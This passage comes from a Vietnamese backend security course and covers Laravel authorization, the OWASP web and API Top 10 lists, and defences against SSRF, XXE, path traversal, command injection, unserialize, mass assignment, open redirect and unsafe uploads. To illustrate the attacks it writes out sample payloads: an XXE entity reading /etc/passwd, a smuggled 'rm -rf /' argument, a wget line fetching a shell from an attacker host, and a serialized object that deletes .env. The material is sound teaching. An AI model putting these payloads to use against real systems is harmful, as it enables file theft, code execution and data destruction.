- User chưa đăng nhập: mặc định mọi gate và policy trả `false`. Muốn cho khách qua thì khai tham số
  kiểu `?User $user`.
- Kết quả từ chối: `AuthorizationException` được Laravel tự đổi thành HTTP 403; đổi mã bằng
  `Response::denyWithStatus(404)` hoặc `Response::denyAsNotFound()`.

Các chỗ gọi:

| Chỗ gọi | Cú pháp | Ghi chú |
|---|---|---|
| Controller | `Gate::authorize('update', $order);` | Ném exception, thành 403 |
| Model User | `$request->user()->cannot('update', $order)` | Trả bool, tự `abort(403)` |
| Route middleware | `->middleware('can:update,order')` hoặc `->can('update', 'order')` | Tham số thứ hai là tên route parameter, dùng với route model binding |
| Attribute | `#[Authorize('update', 'order')]` trên method controller | Tương đương middleware `can` |
| Blade | `@can('update', $order) ... @endcan` | Chỉ để ẩn/hiện UI, không phải lớp bảo vệ |
| Form Request | method `authorize(): bool` | Trả `false` thì request bị từ chối 403 trước khi validate |
| Job, command | `Gate::forUser($user)->authorize(...)` | Không có user hiện tại, phải truyền vào |

Hành động không cần instance (ví dụ `create`) thì truyền tên class:
`Gate::authorize('create', Order::class)`.

⚠️ Policy chỉ chạy khi được gọi. Viết `OrderPolicy` đầy đủ nhưng controller không gọi
`authorize` là không có kiểm tra nào, và không có lỗi nào báo cho bạn biết. Cách phòng: test
"user B gọi endpoint sửa đơn của user A thì nhận 403/404" cho từng endpoint, và rà code review.

⚠️ `@can` trong Blade chỉ ẩn nút. Endpoint phía sau vẫn phải tự kiểm tra (đúng ví dụ Scenario #3
của OWASP A01: logic quyền nằm ở front-end, kẻ tấn công `curl` thẳng).

#### Quyền ở mức field

*Broken Object Property Level Authorization* (API3:2023 trong OWASP API Top 10): user có quyền với
object, nhưng đọc hoặc sửa được **thuộc tính** không được phép. OWASP gộp hai mục của bản 2019 vào
đây để nhấn vào nguyên nhân gốc là thiếu kiểm tra quyền ở mức property:

- Sửa được field cấm (trước là *Mass Assignment*): gửi thêm `"is_admin": true` hay `"balance":
  999999` khi cập nhật profile, và code gán thẳng mọi field từ request vào model. Chi tiết và cách
  chặn ở [module 2.6](#26-lỗ-hổng-web-và-api-theo-owasp).
- Đọc được field thừa (trước là *Excessive Data Exposure*): API trả nguyên model gồm
  `password_hash`, `internal_note`, `cost_price`, rồi để front-end tự lọc. Kẻ tấn công đọc thẳng
  JSON.

```php
// SAI: trả nguyên model, mọi cột (trừ $hidden) đều ra ngoài
return $order;

// ĐÚNG: API Resource chọn rõ từng field, và field nhạy cảm có điều kiện theo quyền
final class OrderResource extends JsonResource
{
    public function toArray(Request $request): array
    {
        return [
            'id'     => $this->id,
            'status' => $this->status,
            'total'  => $this->total,
            // chỉ nhân viên có quyền mới thấy giá vốn
            'cost_price' => $this->when(
                $request->user()?->can('viewCost', $this->resource) === true,
                $this->cost_price,
            ),
        ];
    }
}
```

Nguyên tắc: whitelist field ở cả hai chiều. Chiều vào: `$fillable`, DTO, `$request->validated()`.
Chiều ra: API Resource hoặc DTO, không trả model thô.

**Tóm tắt nhanh**
- RBAC gắn quyền vào role, ABAC tính từ thuộc tính (user, resource, môi trường), ReBAC tính từ đồ
  thị quan hệ (Zanzibar: tuple `object#relation@user` cộng rewrite rule). Thực tế hay dùng RBAC cộng
  kiểm tra ownership; Drive-like thì ReBAC.
- Quyền thô ở middleware/gateway; quyền trên object ở service/domain. Job, command, GraphQL resolver,
  consumer là các đường vòng qua controller.
- Laravel: Gate cho quyền không gắn model, Policy cho quyền theo model. `before` trả khác `null` là
  kết quả cuối; trả `true` bỏ qua mọi luật.
- Policy không tự chạy; `@can` chỉ là UI. Test "user B sửa đồ của user A" cho từng endpoint.
- Quyền mức field (API3:2023): whitelist field ghi vào và field trả ra.

**Nguồn**: [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) · [Zanzibar (USENIX ATC 2019)](https://research.google/pubs/zanzibar-googles-consistent-global-authorization-system/) · [OpenFGA Concepts](https://openfga.dev/docs/concepts) · [Laravel: Authorization](https://laravel.com/docs/authorization) · [OWASP API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) · [OWASP Top 10:2025 A01](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

---

### 2.6 Lỗ hổng web và API theo OWASP

Module này trả lời: hai danh sách OWASP (Top 10:2025 cho web, API Security Top 10 2023 cho API)
gồm những gì và đổi gì so với trước, rồi đào sâu các lỗ hổng mà backend PHP gặp thật khi làm
webhook, tải ảnh từ URL, import XML, gọi lệnh shell, upload file: SSRF, XXE, path traversal,
command injection, `unserialize`, mass assignment, open redirect, clickjacking.

#### OWASP Top 10:2025

OWASP Top 10 là tài liệu nâng cao nhận thức (awareness document) về các nhóm rủi ro nghiêm trọng
nhất của ứng dụng web. Mỗi mục là một **nhóm** gồm nhiều *CWE* (Common Weakness Enumeration, mã
phân loại điểm yếu của MITRE), không phải một lỗi cụ thể. Bản 2025 là lần thứ 8. Cách chọn: 8 mục
lấy từ dữ liệu kiểm thử đóng góp (hơn 2,8 triệu ứng dụng), 2 mục do khảo sát cộng đồng đề cử, vì dữ
liệu kiểm thử luôn "nhìn về quá khứ" và bỏ sót thứ chưa tự động test được. Bản 2025 cố xếp theo
**nguyên nhân gốc** (root cause) hơn là triệu chứng.

| 2025 | Tên | So với 2021 |
|---|---|---|
| A01 | Broken Access Control | Giữ #1. **SSRF (A10:2021) được gộp vào đây** |
| A02 | Security Misconfiguration | Lên từ #5 |
| A03 | Software Supply Chain Failures | **Mới**, mở rộng từ A06:2021 Vulnerable and Outdated Components |
| A04 | Cryptographic Failures | Xuống từ #2 |
| A05 | Injection | Xuống từ #3 (gồm cả XSS) |
| A06 | Insecure Design | Xuống từ #4 |
| A07 | Authentication Failures | Giữ #7, đổi tên từ "Identification and Authentication Failures" |
| A08 | Software or Data Integrity Failures | Giữ #8 |
| A09 | Security Logging and Alerting Failures | Giữ #9, đổi "Monitoring" thành "Alerting": log mà không cảnh báo thì gần như vô dụng |
| A10 | Mishandling of Exceptional Conditions | **Mới** |

Ba thay đổi lớn để trả lời phỏng vấn: (1) SSRF gộp vào Broken Access Control; (2) A03 Software
Supply Chain Failures thay cho "thành phần có lỗ hổng đã biết", mở rộng ra toàn bộ chuỗi build,
phân phối, cập nhật (A03 đứng đầu khảo sát cộng đồng); (3) A10 mới về xử lý điều kiện bất thường.
Thêm một ý: Misconfiguration nhảy từ #5 lên #2, vì hành vi của phần mềm ngày càng nằm trong cấu hình.

*A01 Broken Access Control*: trang của OWASP ghi 100% ứng dụng được test có một dạng lỗi này.
Gồm IDOR, thiếu kiểm tra cho POST/PUT/DELETE, leo quyền, sửa JWT/cookie/hidden field để leo quyền,
CORS sai, *force browsing* (đoán URL trang quản trị), CSRF, SSRF. Cách phòng là nội dung các module
[1.5](#15-authentication-authorization-và-idor) và [2.5](#25-authorization-mô-hình-và-tầng-kiểm-tra):
deny by default, kiểm tra ở server, cài một lần và dùng lại, bắt buộc ownership ở model, log và
cảnh báo khi bị từ chối nhiều lần, rate limit, test quyền trong unit/integration test.

*A02 Security Misconfiguration* trong thực tế:
- Debug mode bật ở production, trang lỗi trả stack trace (lộ phiên bản thư viện, đường dẫn, query).
- `.git`, `.env`, file backup truy cập được qua web; directory listing bật.
- Bucket (S3) public, tài khoản mặc định chưa đổi password, sample app chưa gỡ.
- Admin panel mở ra internet; CORS quá rộng ([module 2.7](#27-header-bảo-mật-csrf-hiện-đại-cors)).
- Thiếu security header. XXE (CWE-611) cũng được xếp vào A02 trong bản 2025.

*A03 Software Supply Chain Failures*: lỗ hổng hoặc mã độc trong dependency (kể cả dependency bắc
cầu), công cụ build, CI/CD, IDE extension, registry. Ví dụ OWASP nêu: SolarWinds (2019), vụ trộm
Bybit 2025, worm npm Shai-Hulud 2025 tự lan bằng cách dùng npm token tìm được trên máy nạn nhân để
đẩy bản độc của các package khác. Cách phòng chính: SBOM, theo dõi CVE của mọi dependency, chỉ lấy
package từ nguồn tin cậy, khoá phiên bản, tách quyền trong CI/CD, rollout từng phần. Chi tiết ở
[module 3.4](#34-secret-và-supply-chain).

*A10 Mishandling of Exceptional Conditions*: app không lường trước, không phát hiện, hoặc phản ứng
sai khi gặp tình huống bất thường (thiếu tham số, hết bộ nhớ, mất mạng, thiếu quyền). Hậu quả hay
gặp:
- *Fail open*: lỗi thì cho qua. Ví dụ `try { $allowed = $authz->check(...); } catch (Throwable) {
  $allowed = true; }`, hoặc service phân quyền timeout thì mặc định cho phép.
- `try/catch` nuốt exception rồi chạy tiếp với trạng thái dở dang.
- Trang lỗi lộ thông tin (CWE-209), giúp kẻ tấn công dò SQL injection.
- Giao dịch nhiều bước (trừ tiền, cộng tiền, ghi log) bị ngắt giữa chừng mà không rollback toàn bộ.
  OWASP gọi rollback toàn bộ là *failing closed*.
- Tài nguyên không được giải phóng sau exception (file handle, lock), dồn lại thành DoS.

Cách phòng theo OWASP: bắt lỗi ngay tại chỗ xảy ra và xử lý có ý nghĩa, có global exception handler
làm lưới cuối, xử lý lỗi tập trung một kiểu thống nhất, rollback toàn bộ giao dịch, đặt giới hạn
(rate limit, quota) cho mọi thứ vì "nothing in information technology should be limitless".

#### OWASP API Security Top 10 (2023)

Danh sách riêng cho API, vì API lộ nhiều endpoint và id hơn web truyền thống:

| Mã | Tên | Ý chính |
|---|---|---|
| API1 | Broken Object Level Authorization (BOLA) | Đổi id là xem được object của người khác ([1.5](#15-authentication-authorization-và-idor)) |
| API2 | Broken Authentication | Cơ chế xác thực cài sai, token bị chiếm hoặc giả |
| API3 | Broken Object Property Level Authorization | Gộp *Excessive Data Exposure* và *Mass Assignment* của bản 2019 ([2.5](#25-authorization-mô-hình-và-tầng-kiểm-tra)) |
| API4 | Unrestricted Resource Consumption | Không giới hạn CPU, bộ nhớ, băng thông, hoặc tài nguyên **tính tiền theo request** (SMS, email) |
| API5 | Broken Function Level Authorization (BFLA) | User thường gọi được chức năng admin |
| API6 | Unrestricted Access to Sensitive Business Flows | Luồng nghiệp vụ (mua vé, đăng bình luận) bị tự động hoá hàng loạt, không nhất thiết do bug ([2.9](#29-chống-lạm-dụng-rate-limit-brute-force-bot)) |
| API7 | Server Side Request Forgery | API tải tài nguyên từ URI user đưa mà không kiểm tra |
| API8 | Security Misconfiguration | Cấu hình sai ở bất kỳ tầng nào |
| API9 | Improper Inventory Management | Không nắm được đang chạy những host, API và phiên bản nào; bản cũ, endpoint debug còn sống |
| API10 | Unsafe Consumption of APIs | Tin dữ liệu từ API bên thứ ba hơn input của user, nên kẻ tấn công đánh vào bên thứ ba |

Mẹo gán rủi ro cho một endpoint: hỏi lần lượt "có nhận id không" (API1), "có nhận object để ghi
không" (API3), "có chức năng chỉ admin được dùng không" (API5), "có tốn tài nguyên hoặc tiền không"
(API4), "có phải luồng kiếm lợi được khi tự động hoá không" (API6), "có nhận URL không" (API7).

#### SSRF (Server-Side Request Forgery)

Là gì: kẻ tấn công khiến **server của bạn** gửi request tới đích hắn chọn. Nguy hiểm vì server nằm
trong mạng nội bộ, sau firewall, và nhiều hệ thống nội bộ tin mọi request đến từ bên trong.

Tính năng hay dính: webhook (user khai URL callback), tải avatar từ URL, preview link, import từ
URL, render PDF từ HTML (trình render tải ảnh, CSS). XXE cũng dẫn tới SSRF.

Đích nguy hiểm:
- `169.254.169.254`: metadata service của AWS, GCP, Azure. Trên AWS với IMDSv1, một GET đơn giản
  trả được credential tạm của IAM role gắn với máy.
- `127.0.0.1`, `localhost`: trang admin chỉ nghe localhost, hoặc app cho truy cập không cần đăng nhập
  khi request đến từ máy local.
- Dải private `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`: DB, Redis, dashboard nội bộ thường
  không có xác thực.
- SSRF không chỉ là HTTP: nếu thư viện hỗ trợ, các scheme như `file://`, `gopher://`, `dict://`,
  `phar://` mở thêm đường tấn công.

Vì sao blacklist chuỗi không đủ (PortSwigger): `127.0.0.1` viết được thành `2130706433` (dạng số
nguyên), `017700000001` (bát phân), `127.1`; kẻ tấn công đăng ký domain resolve ra `127.0.0.1`; URL
encode; hoặc đưa URL tới server của hắn rồi **redirect** sang đích nội bộ. Parser URL cũng khác
nhau: `https://expected-host:fakepassword@evil-host` có host thật là `evil-host`.

Cách chặn, theo thứ tự ưu tiên:
1. Nếu biết trước đích (gọi đối tác cố định): **allowlist** host, và tự dựng URL từ entry khớp
   (scheme, port, path do code quyết định), không nhận nguyên URL từ user.
2. Nếu phải nhận URL bất kỳ (webhook): chỉ cho `http`/`https`; resolve DNS lấy **mọi** bản ghi A và
   AAAA; từ chối nếu **bất kỳ** IP nào không phải địa chỉ công khai (loopback, private, link-local,
   IPv6 tương ứng như `::1`, `fc00::/7`, `fe80::/10`, cả IPv4-mapped `::ffff:127.0.0.1`).
3. Tắt tự follow redirect. Nếu nghiệp vụ cần redirect, tự follow từng bước và **kiểm tra lại từ đầu**
   với URL mới.
4. Kết nối tới **đúng IP đã kiểm tra** (chống DNS rebinding, xem dưới).
5. Tầng mạng: đi qua *egress proxy* (proxy kiểm soát mọi kết nối ra ngoài, ví dụ Smokescreen của
   Stripe) hoặc firewall chặn app gọi vào dải nội bộ. Đây là lớp bảo vệ khó bypass nhất vì không
   phụ thuộc code.
6. AWS: chuyển sang IMDSv2 và tắt IMDSv1. IMDSv2 yêu cầu lấy session token bằng request `PUT` rồi
   gửi kèm header, nên SSRF chỉ điều khiển được URL của một GET thì không lấy được credential.

⚠️ *DNS rebinding* (OWASP gọi là DNS pinning bypass):
1. Kẻ tấn công kiểm soát DNS của `evil.example`, đặt TTL rất thấp.
2. Lúc validate, app resolve `evil.example` ra IP công khai, qua kiểm tra.
3. Lúc gọi thật, thư viện HTTP resolve lại, lần này DNS trả `127.0.0.1`.
- Sửa: resolve một lần, kiểm tra, rồi bắt thư viện HTTP kết nối tới đúng IP đó (curl có
  `CURLOPT_RESOLVE`), hoặc để egress proxy làm việc resolve và kiểm tra.

```php
<?php

declare(strict_types=1);

/** @return list<string> mọi IP (v4 và v6) của host */
function resolveAll(string $host): array
{
    if (filter_var($host, FILTER_VALIDATE_IP) !== false) {
        return [$host];
    }
    $ips = [];
    foreach (dns_get_record($host, DNS_A | DNS_AAAA) ?: [] as $r) {
        if (isset($r['ip'])) {
            $ips[] = $r['ip'];
        } elseif (isset($r['ipv6'])) {
            $ips[] = $r['ipv6'];
        }
    }
    if ($ips === []) {
        throw new RuntimeException('Không resolve được host');
    }
    return $ips;
}

/** Tải URL do user cung cấp, chống SSRF. Cần PHP 8.2+ cho FILTER_FLAG_GLOBAL_RANGE. */
function fetchUntrustedUrl(string $url, int $maxRedirects = 3): string
{
    for ($hop = 0; $hop <= $maxRedirects; $hop++) {
        $p = parse_url($url);
        $scheme = strtolower($p['scheme'] ?? '');
        $host = trim($p['host'] ?? '', '[]');           // IPv6 literal có dấu []
        if (!in_array($scheme, ['http', 'https'], true) || $host === '' || isset($p['user'])) {
            throw new InvalidArgumentException('URL không được phép');
        }
        $port = $p['port'] ?? ($scheme === 'https' ? 443 : 80);

        $ips = resolveAll($host);
        foreach ($ips as $ip) {                         // MỌI IP phải là địa chỉ công khai
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_GLOBAL_RANGE) === false) {
                throw new RuntimeException("Đích bị chặn: {$ip}");
            }
        }
        $pinned = str_contains($ips[0], ':') ? "[{$ips[0]}]" : $ips[0]; // curl cần IPv6 trong []
        // Host là IP literal thì curl không resolve, không cần ghim
        $resolve = filter_var($host, FILTER_VALIDATE_IP) !== false ? [] : ["{$host}:{$port}:{$pinned}"];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RESOLVE        => $resolve,                       // ghim IP, không resolve lại
            CURLOPT_FOLLOWLOCATION => false,                          // tự xử lý redirect
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT        => 10,
        ]);
        $body = curl_exec($ch);
        if ($body === false) {
            throw new RuntimeException('Tải thất bại: ' . curl_error($ch));
        }
        $next = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
        if (!is_string($next) || $next === '') {
            return $body;                               // không redirect: xong
        }
        $url = $next;                                   // có redirect: vòng lặp kiểm tra lại từ đầu
    }
    throw new RuntimeException('Quá nhiều redirect');
}
```

Code trên là khung để hiểu các bước; production cần thêm giới hạn kích thước response và chạy sau
egress proxy. ⚠️ Trong Laravel, `Http::` dùng Guzzle, mặc định tự follow redirect; tắt bằng
`Http::withoutRedirecting()` khi gọi URL của user.

#### Các lỗi injection khác

*XXE (XML External Entity)*: XML cho phép khai *DTD* (Document Type Definition) trong `<!DOCTYPE>`,
trong đó định nghĩa *entity* (biến thay thế). *External entity* trỏ tới file hoặc URL; parser cấu
hình yếu sẽ đọc nội dung đó và nhét vào tài liệu.

```xml
<?xml version="1.0"?>
<!DOCTYPE order [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order><note>&xxe;</note></order>
```

Nếu app in lại `note`, kẻ tấn công đọc được `/etc/passwd`. Thay `file://` bằng
`http://169.254.169.254/...` là thành SSRF. DTD còn cho phép *Billion Laughs*: entity lồng nhau nở
theo cấp số nhân, làm cạn bộ nhớ.

- Chặn tổng quát (OWASP): **tắt DTD hoàn toàn**. Không tắt được thì tắt external entity và external
  DTD theo cách riêng của từng parser.
- PHP: từ libxml 2.9.0, việc tải external entity bị tắt mặc định, và PHP 8.0 trở lên dùng libxml từ 2.9.0,
  nên `libxml_disable_entity_loader()` bị deprecated từ PHP 8.0 (không còn cần). Parse mặc định bằng
  `simplexml_load_string($xml)` hay `DOMDocument::loadXML($xml)` không nạp external entity.
- ⚠️ Đừng truyền `LIBXML_NOENT`: tên gây hiểu nhầm ("no entity") nhưng nghĩa là **substitute
  entities**, tức bật lại việc thay entity. `LIBXML_DTDLOAD`, `LIBXML_DTDVALID` cũng mở lại việc tải
  external entity. PHP 8.4 thêm hằng `LIBXML_NO_XXE` (cần libxml ≥ 2.13.0) để chặn XXE khi buộc phải
  thay entity.
- Cách phòng thủ thêm: sau khi load bằng DOMDocument, từ chối nếu `$dom->doctype !== null`, vì dữ
  liệu nghiệp vụ hầu như không bao giờ cần DOCTYPE.
- Nếu được, nhận JSON thay XML. Nhớ rằng SVG, DOCX, XLSX đều là XML (hoặc zip chứa XML).

*Path traversal*: input dùng làm đường dẫn file, `../` đưa ra ngoài thư mục cho phép, ví dụ
`GET /download?file=../../../etc/passwd`.

Các cách bypass filter hay gặp (PortSwigger): đường dẫn tuyệt đối `/etc/passwd`; lồng chuỗi
`....//` (filter xoá `../` một lần thì còn lại `../`); URL encode `%2e%2e%2f` hoặc double encode
`%252e%252e%252f`; bắt đầu bằng thư mục gốc hợp lệ rồi mới `../` (`/var/www/images/../../../etc/passwd`);
null byte `%00` để cắt đuôi `.png` (chỉ có tác dụng với runtime cũ).

```php
function safePath(string $baseDir, string $userFile): string
{
    $base = realpath($baseDir);
    $full = realpath($base . DIRECTORY_SEPARATOR . $userFile);
    // realpath trả false nếu file không tồn tại; so với base + dấu phân cách
    // để "/data/files-secret" không lọt qua kiểm tra prefix "/data/files"
    if ($base === false || $full === false
        || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
        throw new RuntimeException('Đường dẫn không hợp lệ');
    }
    return $full;
}
```

Tốt hơn nữa (PortSwigger coi là cách hiệu quả nhất): không đưa input vào API filesystem. Lưu file
theo id, tra id ra tên file thật trong DB (`/download/42` thay vì `/download?file=report.pdf`).

*Command injection*: input được ghép vào lệnh shell, shell hiểu các ký tự như `;`, `|`, `&`, `$`, `>`, `<` và dấu backtick là cú
pháp. `exec("convert $file out.png")` với `$file = "a.jpg; rm -rf /"` chạy thêm lệnh thứ hai.

- Ưu tiên 1: **không gọi shell**. Dùng hàm có sẵn (`mkdir()` thay `system('mkdir ...')`), thư viện
  (Imagick thay lệnh `convert`).
- Ưu tiên 2: truyền **mảng tham số**, không qua shell. PHP: `proc_open(['convert', $file,
  'out.png'], ...)` (dạng mảng có từ PHP 7.4), `new Symfony\Component\Process\Process(['convert',
  $file, 'out.png'])`. Go: `exec.Command("convert", file, "out.png")` không gọi shell. Java:
  `ProcessBuilder` với từng tham số riêng.
- Tối thiểu: `escapeshellarg()` cho **từng** tham số (bọc trong nháy đơn). Không dùng
  `escapeshellcmd()` cho input của user: nó chặn lệnh thứ hai nhưng vẫn cho thêm tham số.
- ⚠️ *Argument injection*: kể cả khi đã escape, input bắt đầu bằng `-` vẫn thành option của chương
  trình. Ví dụ OWASP: `wget` với URL là `--directory-prefix=. http://attacker/shell.php` qua
  `escapeshellcmd` ghi file độc vào thư mục web. Sửa: validate allowlist, hardcode option, và đặt
  `--` trước tham số của user (theo quy ước POSIX, mọi thứ sau `--` là operand, không phải option).

#### Insecure deserialization

*Serialize* là biến object thành chuỗi để lưu hoặc gửi; *deserialize* là dựng lại object. Định dạng
native của PHP ghi cả tên class và mọi property:

```
O:4:"User":2:{s:4:"name";s:5:"carol";s:7:"isAdmin";b:0;}
```

⚠️ `unserialize()` với dữ liệu người dùng cho phép dựng object của **bất kỳ class nào** mà autoloader
tìm được, với property do kẻ tấn công chọn. PortSwigger gọi đây là *object injection*.

1. Kẻ tấn công gửi chuỗi serialize của một object với property hắn chọn.
2. PHP tự gọi *magic method*: `__wakeup()` hoặc `__unserialize()` ngay khi dựng object, `__destruct()`
   khi object bị huỷ (cuối request), và các method như `__toString()` nếu object bị dùng như chuỗi.
3. Code trong các magic method đó của thư viện có sẵn trong `vendor/` (gọi là *gadget*) nối với nhau
   thành *gadget chain*: property của object này là object khác, method này gọi method kia, cuối
   cùng tới một *sink* như ghi file, `call_user_func`, `system`. Kết quả là *RCE* (Remote Code
   Execution, chạy lệnh tuỳ ý trên server).
- Code của bạn không cần gọi hàm nguy hiểm nào; tấn công hoàn tất ngay trong lúc deserialize,
  trước khi code kiểm tra kiểu của bạn chạy. Công cụ như PHPGGC có sẵn gadget chain cho nhiều
  framework phổ biến.

```php
// Một class "vô hại" trong thư viện nào đó
final class TempFile
{
    public string $path = '/tmp/cache.tmp';
    public function __destruct() { @unlink($this->path); }   // dọn file tạm
}

// Kẻ tấn công gửi cookie: O:8:"TempFile":1:{s:4:"path";s:13:"/var/www/.env";}
$prefs = unserialize($_COOKIE['prefs']);   // cuối request, __destruct xoá file .env
```

Cách sửa:
- Dùng JSON (`json_encode`/`json_decode`) cho mọi dữ liệu đi qua tay user. JSON chỉ ra mảng và giá
  trị vô hướng, không dựng object của class tuỳ ý.
- ⚠️ Tài liệu PHP cảnh báo rõ: không truyền input không tin cậy vào `unserialize()` **bất kể giá trị
  `allowed_classes`**, vì việc dựng object và autoload có thể dẫn tới chạy code. `['allowed_classes'
  => false]` chỉ giảm rủi ro (object thành `__PHP_Incomplete_Class`), không biến nó thành an toàn.
- Nếu buộc phải unserialize dữ liệu lưu bên ngoài (cache, queue) do **chính bạn** serialize: ký
  HMAC (`hash_hmac`) khi ghi và kiểm tra bằng `hash_equals` **trước** khi unserialize, để chắc
  không ai sửa được dữ liệu. Kiểm tra sau khi unserialize là quá muộn.
- Phar: trước PHP 8.0, gọi hàm file (như `file_exists`) trên đường dẫn `phar://` do user kiểm soát
  cũng kích hoạt unserialize metadata của file phar. Đây là lý do không để user điều khiển đầy đủ
  đường dẫn file.
- Liên hệ Laravel: lộ `APP_KEY` từng dẫn tới RCE qua cookie được serialize
  ([module 2.8](#28-tầng-phplaravel)).

Đối chiếu: Java `ObjectInputStream`, Python `pickle`, `yaml.load` của PyYAML có cùng bản chất. Nguyên
tắc chung của PortSwigger: lỗ hổng là **việc deserialize input của user**, không phải sự tồn tại của
gadget; đừng cố vá từng gadget.

#### Mass assignment, open redirect, clickjacking

*Mass assignment* (Rails, Node gọi vậy; Spring, ASP.NET gọi *autobinding*): framework tự gán mọi
field trong request vào object, user gửi thêm field không có trên form.

```php
// SAI: user gửi thêm is_admin=1 hoặc balance=999999
$user->update($request->all());

// ĐÚNG: chỉ những field đã validate
$user->update($request->validated());      // Form Request chỉ khai name, email
// và model khai whitelist
protected $fillable = ['name', 'email'];
```

- Chặn: whitelist field (`$fillable`, DTO, `$request->validated()` hoặc `$request->only([...])`).
- ⚠️ `protected $guarded = [];` là mở toang mọi cột. `Model::unguard()` và `forceFill()` cũng bỏ qua
  bảo vệ; chỉ dùng với dữ liệu không đến từ user.
- Chiều ngược lại (field thừa trong response): dùng API Resource chọn field trả ra
  ([module 2.5](#25-authorization-mô-hình-và-tầng-kiểm-tra)).

*Open redirect*: `?next=`, `?returnUrl=` cho phép redirect tới site bất kỳ. Link trông như của bạn
(`https://shop.vn/login?next=https://shop-vn.evil/`) nên phishing dễ thành công; sau khi đăng nhập
thật, nạn nhân bị đưa sang trang giả hỏi lại password. Trong OAuth, open redirect còn giúp đánh cắp
authorization code.

- Chặn (OWASP): tốt nhất không nhận URL làm đích; nhận một mã ngắn hoặc id rồi map sang URL ở
  server. Nếu phải nhận: chỉ cho path tương đối, hoặc so host với allowlist. Có thể thêm trang trung
  gian "bạn sắp rời khỏi site".
- ⚠️ `//evil.com` và `/\evil.com` trông như path tương đối, nhưng trình duyệt hiểu là URL tuyệt đối
  cùng scheme (`//` là *protocol-relative URL*; trình duyệt coi `\` như `/` trong URL http/https).
  Kiểm tra "bắt đầu bằng `/`" là chưa đủ; cần bắt đầu bằng `/` **và** ký tự thứ hai không phải `/`
  hay `\`, hoặc parse URL và so host.
- ⚠️ Code PHP thuần `header('Location: ...')` mà không `exit` thì phần còn lại của trang vẫn chạy và
  trả về cho client bỏ qua redirect.

*Clickjacking*: site độc nhúng trang của bạn trong `<iframe>` trong suốt đặt đè lên một nút mồi.
Nạn nhân tưởng bấm "Nhận quà" nhưng thật ra bấm "Xác nhận chuyển tiền" trên trang thật, với cookie
thật. CSRF token không giúp được, vì request đi từ chính trang của bạn.

- Chặn bằng header: `Content-Security-Policy: frame-ancestors 'none'` (hoặc `'self'` nếu tự nhúng
  mình). `frame-ancestors` là cách hiện đại thay cho `X-Frame-Options: DENY`/`SAMEORIGIN`. Chi tiết
  header ở [module 2.7](#27-header-bảo-mật-csrf-hiện-đại-cors).
- Cookie `SameSite=Lax` hoặc `Strict` cũng làm trang trong iframe cross-site không có session.

#### File upload

Upload là nơi hội tụ nhiều lỗi: chạy code trên server (upload `shell.php`), XSS cho người xem, XXE
qua SVG/DOCX, DoS qua file khổng lồ. OWASP nhấn mạnh không có "viên đạn bạc", phải phòng thủ nhiều
lớp.

Kiểm tra và lưu:
- Allowlist phần mở rộng, chỉ những loại nghiệp vụ cần (ảnh đại diện: một định dạng; CV: `pdf`,
  `docx`). Kiểm tra sau khi decode tên file. Các bypass hay gặp: đuôi kép `.jpg.php`, null byte
  `.php%00.jpg`, đổi hoa thường `.pHp`, đuôi thay thế mà server vẫn chạy như PHP (`.phtml`, `.php5`,
  `.pht`).
- Không tin `Content-Type` client gửi (sửa được tuỳ ý). Kiểm tra *magic bytes* (chữ ký ở vài byte
  đầu, ví dụ PNG bắt đầu bằng `\x89PNG`) bằng `finfo`/`mime_content_type`. ⚠️ OWASP lưu ý magic
  bytes cũng dễ giả (file *polyglot* vừa là ảnh hợp lệ vừa chứa code), nên đây là một lớp chứ
  không phải lớp duy nhất.
- Đổi tên thành chuỗi ngẫu nhiên (UUID) do app sinh; giữ tên gốc trong DB nếu cần hiển thị.
- Lưu trên host khác hoặc object storage (S3); không được thì ngoài web root. Thư mục upload không
  được thực thi, và tắt override cấu hình theo thư mục (kẻ tấn công upload `.htaccess` để map đuôi
  `.jpg` thành PHP).
- Giới hạn kích thước, số lượng, và chỉ user đã đăng nhập có quyền mới upload được.

Phục vụ file:
- Từ domain riêng (ví dụ `usercontent.example-cdn.com`), để file HTML/SVG độc có chạy JS cũng không
  đụng được cookie và origin của domain chính.
- `Content-Disposition: attachment` cho file không cần hiển thị inline, kèm
  `X-Content-Type-Options: nosniff`.
- Re-encode ảnh (mở bằng thư viện ảnh rồi ghi lại) để loại dữ liệu lạ nhét trong file.

⚠️ Các bẫy:
- SVG là XML, chứa được `<script>`: mở trực tiếp trên domain của bạn là stored XSS. Không cho upload
  SVG, hoặc sanitize, hoặc chỉ phục vụ từ domain riêng dưới dạng attachment.
- *Zip bomb*: file nén vài KB giải ra hàng GB. Giới hạn kích thước **sau** giải nén, đếm dần khi
  giải chứ không tin kích thước khai trong header. Zip còn có path traversal trong tên entry
  (`../../app/config.php`, gọi là *zip slip*).
- Ảnh có kích thước pixel khổng lồ (file nhỏ nhưng 50000 × 50000 pixel) làm nổ memory khi resize.
  Đọc kích thước (`getimagesize`) và từ chối trước khi xử lý.
- Thư viện xử lý file cũng có lỗ hổng (ví dụ ImageTragick của ImageMagick): cập nhật, và cân nhắc
  xử lý trong sandbox hoặc worker tách biệt.

**Tóm tắt nhanh**
- Top 10:2025: A01 Access Control (gộp SSRF), A02 Misconfiguration (lên từ #5), A03 Supply Chain
  (mới, mở rộng từ Vulnerable Components), A10 Mishandling of Exceptional Conditions (mới, fail open).
- API Top 10 2023: BOLA, Broken Auth, Object Property Level (gộp mass assignment và data exposure),
  Resource Consumption, BFLA, Business Flows, SSRF, Misconfig, Inventory, Unsafe Consumption.
- SSRF: chỉ http/https, resolve mọi IP rồi chặn IP không công khai, tắt redirect hoặc kiểm tra lại
  mỗi bước, kết nối tới đúng IP đã kiểm (chống DNS rebinding), egress proxy, IMDSv2.
- XXE: tắt DTD; PHP 8 mặc định an toàn nhưng `LIBXML_NOENT` bật lại. Command injection: mảng tham
  số không qua shell, `--`. Path traversal: id thay vì tên file.
- `unserialize` input của user là RCE qua gadget chain trong vendor; `allowed_classes` không đủ,
